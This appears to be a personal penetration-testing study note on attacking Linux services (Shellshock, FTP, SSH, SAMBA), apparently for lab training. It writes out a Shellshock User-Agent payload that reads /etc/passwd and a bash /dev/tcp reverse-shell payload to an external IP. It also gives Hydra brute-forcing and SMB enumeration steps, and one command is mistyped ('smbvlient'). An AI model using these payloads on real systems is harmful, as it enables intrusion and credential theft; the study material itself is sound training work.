- Based on Linux kernel
- Linux OS = GNU/Linux
- Typically used for servers
- Common services
	- Apache Web Servers: 80/443
	- SSH: 22
	- FTP: 21
	- SAMBA: 445

## Shellshock (CVE-2014-6271)
- Family of vulnerabilities in Bash shell (since v1.3)
- Caused when Bash mistakenly executed trailing commands after a series of characters: (){;:};.
- Apache web servers configured to run CGI scirpt or .sh scripts are also vulnerable
- Need to locate an input vector or script that allows to communicate with Bash

### Exploitation
- Run `nmap` scan with ![[Nmap Scripts#Shellshock]] 
- Check if the target is vulnerable
- If yes, start Burp and proxy the browser traffic through it
- Go to the .cgi page and send that request to Repeater in Burp.
- Remove the `User-Agent` content and enter special characters `() { :; }; echo; echo; /bin/bash -c cat /etc/passwd`
- Start a #tools/utility/nc listener `nc -nlvp 1234`
- Change the payload to:
	```
	() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.24.241.2/1234 0>&1'
	```
- And there you get a reverse shell
- The same can be done with metasploit ![[Modules#Shellshock]]
## FTP
- Check for `anonymous` access
- There are different implementation of FTP like VSFTP, ProFTP and the vulnerabilities depend on the version

### Exploitation
- Run an #tools/multi/nmap scan to check the version of FTP running on the server
- Bruteforce credentials ![[Hydra#FTP]]
## SSH
- Go brute force!
![[Hydra#SSH]]

## SAMBA
- Network file sharing protocol that is used to facilitate the sharing of files and peripherals on LAN
- Linux implementation of SMB
- Does not come with Linux by default, so it needs to be installed
- This is not a common service running on a linux machine
- Uses username/password authentication.
- Use tool #tools/enum/smb/smbclient  and #tools/enum/smb/SMBMap 

### Exploitation
- Run #tools/multi/nmap to look for ports open assoiciated with SMB/SAMBA
- Run #tools/bruteforce/hydra to brute force username/password pair
- Start #tools/enum/smb/SMBMap 
	```
	smbmap -H <target_ip> -u <username> -p <password>
	```
- Start #tools/enum/smb/smbclient to get list of shares
	```
	smbvlient -L <target_ip> -U <username>
	```
- Run the command to connect to the target machine via SMB
	```
	smbclient //<target_ip>/<share> -U <username>
	```
- You can use #tools/enum/smb/enum4linux to get more detailed information
	```
	enum4linux -a -u <username> -p <password> <targetip>
	````